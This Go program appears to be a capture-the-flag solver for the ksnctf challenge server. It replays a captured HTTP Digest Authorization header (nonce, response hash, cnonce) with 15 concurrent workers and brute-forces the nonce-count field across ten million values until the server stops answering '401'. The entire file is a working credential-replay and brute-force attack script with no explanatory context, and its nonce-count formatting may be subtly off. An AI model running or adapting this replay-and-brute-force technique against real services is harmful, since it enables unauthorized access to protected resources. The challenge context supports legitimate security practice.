package main

import (
	"net/http"
	"io/ioutil"
	"fmt"
	"strings"
)

func main() {
	ncs := make(chan int64)
	for i := 0; i < 15; i++ {
		wait := make(chan bool)
		go worker(wait, ncs)
		defer func(wait <-chan bool) {
			<-wait
		}(wait)
	}
	var nc int64
	for nc = 0; nc < 10000000; nc++ {
		ncs <- nc
	}
	close(ncs)
}

func worker(wait chan<- bool, ncs <-chan int64) {
	for nc := range ncs {
		ok, err := try(nc)
		if err != nil {
			fmt.Println(err)
		}
		fmt.Printf("%8d: %v\n", nc, ok)
	}
	wait <- true
}

func try(nc int64) (bool, error) {
	req, err := http.NewRequest("GET", "http://ksnctf.sweetduet.info:10080/~q9/", nil)
	if err != nil {
		fmt.Println(err)
		return false, err
	}
	req.Header.Add("Authorization", fmt.Sprintf(`Digest username="q9", realm="secret", nonce="bbKtsfbABAA=5dad3cce7a7dd2c3335c9b400a19d6ad02df299b", uri="/~q9/", algorithm=MD5, response="c3077454ecf09ecef1d6c1201038cfaf", qop=auth, nc=%8d, cnonce="9691c249745d94fc"`, nc))
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return false, err
	}
	bs, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err
	}
	return !strings.Contains(string(bs), "401"), nil
}
